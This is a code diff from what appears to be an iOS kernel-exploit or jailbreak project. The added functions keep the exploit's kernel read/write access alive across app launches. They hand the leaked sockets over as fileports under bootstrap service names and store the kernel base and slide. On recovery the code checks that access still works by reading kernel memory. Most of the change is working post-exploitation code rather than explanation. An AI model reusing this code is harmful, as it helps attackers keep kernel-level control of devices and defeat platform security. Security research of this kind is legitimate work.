@@ -6,11 +6,13 @@
 //
 
 #import <Foundation/Foundation.h>
-#import "fileport.h"
-#import "darksword.h"
-#import "offsets.h"
-#import "persistence.h"
-#import "utils.h"
+#include <errno.h>
+#include <string.h>
+#include "fileport.h"
+#include "darksword.h"
+#include "offsets.h"
+#include "persistence.h"
+#include "utils.h"
 
 #import "TaskRop/RemoteCall.h"
 
@@ -18,7 +20,130 @@ bool recover_proc_self(uint64_t launchd_proc);
 static bool persist_is_ios16(void);
 static bool transfer_krw_to_launchd_ios16(void);
 
+#define PERSIST_RC_TIMEOUT 10000
+#define PERSIST_IOS16_RESEARCH_ENABLED 1
+#define PERSIST_LOG(...) do { printf("(persist) " __VA_ARGS__); fflush(stdout); } while (0)
+
+// Names must stay stable across launches: the next process looks them up in the
+// same bootstrap namespace. Registering twice in one boot fails, which is fine
+// because a successful stash happens once per boot.
+#define PERSIST_SIMPLE_CONTROL_NAME "com.ffkrw.krw.control"
+#define PERSIST_SIMPLE_RW_NAME "com.ffkrw.krw.rw"
+#define PERSIST_SIMPLE_KEY @"KRWPrimitiveSimple"
+
+// The app runs with com.apple.private.security.no-sandbox, so it can register a
+// service in its own bootstrap namespace and look it up from the next launch
+// without launchd-side sandbox extensions. fileport keeps the socket file
+// description alive through the registered send right, which is all kread/kwrite
+// need (the kernel-side socket objects are leaked by so_usecount).
+static bool persist_simple_stash(void)
+{
+    PERSIST_LOG("simple: stash begin control_fd=%d rw_fd=%d\n", control_socket, rw_socket);
+    if (control_socket < 0 || rw_socket < 0) {
+        return false;
+    }
+
+    fileport_t controlPort = FILEPORT_NULL;
+    int rc = fileport_makeport(control_socket, &controlPort);
+    PERSIST_LOG("simple: fileport_makeport(control) rc=%d (%s) port=0x%x\n",
+                rc, rc ? strerror(rc) : "ok", controlPort);
+    if (rc != 0 || controlPort == FILEPORT_NULL) {
+        return false;
+    }
+
+    fileport_t rwPort = FILEPORT_NULL;
+    rc = fileport_makeport(rw_socket, &rwPort);
+    PERSIST_LOG("simple: fileport_makeport(rw) rc=%d (%s) port=0x%x\n",
+                rc, rc ? strerror(rc) : "ok", rwPort);
+    if (rc != 0 || rwPort == FILEPORT_NULL) {
+        return false;
+    }
+
+    kern_return_t kr;
+
+    kr = bootstrap_register(bootstrap_port, PERSIST_SIMPLE_CONTROL_NAME, controlPort);
+    PERSIST_LOG("simple: bootstrap_register(control) kr=0x%x (%s)\n", kr, mach_error_string(kr));
+    if (kr != KERN_SUCCESS) {
+        return false;
+    }
+
+    kr = bootstrap_register(bootstrap_port, PERSIST_SIMPLE_RW_NAME, rwPort);
+    PERSIST_LOG("simple: bootstrap_register(rw) kr=0x%x (%s)\n", kr, mach_error_string(kr));
+    if (kr != KERN_SUCCESS) {
+        return false;
+    }
+
+    NSDictionary *primitive = @{
+        @"KernelBase" : @(kernel_base),
+        @"KernelSlide" : @(kernel_slide),
+    };
+    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+    [defaults setObject:primitive forKey:PERSIST_SIMPLE_KEY];
+    [defaults synchronize];
+    PERSIST_LOG("simple: stashed base=0x%llx slide=0x%llx\n",
+                (unsigned long long)kernel_base, (unsigned long long)kernel_slide);
+    return true;
+}
+
+static bool persist_simple_recover(void)
+{
+    NSDictionary *primitive = [[NSUserDefaults standardUserDefaults] dictionaryForKey:PERSIST_SIMPLE_KEY];
+    if (!primitive) {
+        PERSIST_LOG("simple: nothing stashed\n");
+        return false;
+    }
+
+    mach_port_t controlPort = MACH_PORT_NULL;
+    kern_return_t kr = bootstrap_look_up(bootstrap_port, PERSIST_SIMPLE_CONTROL_NAME, &controlPort);
+    PERSIST_LOG("simple: look_up(control) kr=0x%x (%s)\n", kr, mach_error_string(kr));
+    if (kr != KERN_SUCCESS) {
+        return false;
+    }
+
+    mach_port_t rwPort = MACH_PORT_NULL;
+    kr = bootstrap_look_up(bootstrap_port, PERSIST_SIMPLE_RW_NAME, &rwPort);
+    PERSIST_LOG("simple: look_up(rw) kr=0x%x (%s)\n", kr, mach_error_string(kr));
+    if (kr != KERN_SUCCESS) {
+        return false;
+    }
+
+    int controlFd = fileport_makefd(controlPort);
+    int rwFd = fileport_makefd(rwPort);
+    PERSIST_LOG("simple: fileport_makefd control=%d rw=%d errno=%d\n", controlFd, rwFd, errno);
+    if (controlFd < 0 || rwFd < 0) {
+        return false;
+    }
+
+    uint64_t base = [primitive[@"KernelBase"] unsignedLongLongValue];
+    uint64_t slide = [primitive[@"KernelSlide"] unsignedLongLongValue];
+    if (base == 0) {
+        PERSIST_LOG("simple: stashed base is zero\n");
+        return false;
+    }
+
+    int previousControl = control_socket;
+    int previousRw = rw_socket;
+    control_socket = controlFd;
+    rw_socket = rwFd;
+    uint32_t magic = ds_kread32(base);
+    PERSIST_LOG("simple: verify kread32(0x%llx)=0x%x\n", (unsigned long long)base, magic);
+    if (magic != 0xFEEDFACF) {
+        control_socket = previousControl;
+        rw_socket = previousRw;
+        return false;
+    }
+
+    kernel_base = base;
+    kernel_slide = slide;
+    return true;
+}
+
 bool transfer_krw_to_launchd(void) {
+    if (persist_simple_stash()) {
+        return true;
+    }
+    PERSIST_LOG("simple: stash failed, trying launchd RemoteCall path\n");
+
     bool useIOS16Persistence = persist_is_ios16();
 
     if (useIOS16Persistence) {
@@ -101,6 +226,12 @@ bool transfer_krw_to_launchd(void) {
 }
 
 bool recover_krw_primitives(void) {
+    if (persist_simple_recover()) {
+        PERSIST_LOG("simple: recovered base=0x%llx slide=0x%llx\n",
+                    (unsigned long long)kernel_base, (unsigned long long)kernel_slide);
+        return true;
+    }
+
     // TODO: move primitive data to a file that can be retrieved using bookmark data
     NSDictionary *primitive = [NSUserDefaults.standardUserDefaults dictionaryForKey:@"KRWPrimitive"];
     if (!primitive) {
@@ -154,10 +285,6 @@ bool recover_krw_primitives(void) {
 }
 
 #pragma mark - iOS 16
-
-#define PERSIST_RC_TIMEOUT 10000
-#define PERSIST_IOS16_RESEARCH_ENABLED 1
-#define PERSIST_LOG(...) do { printf("(persist) " __VA_ARGS__); fflush(stdout); } while (0)
 
 static bool persist_is_ios16(void) {
 #if !PERSIST_IOS16_RESEARCH_ENABLED
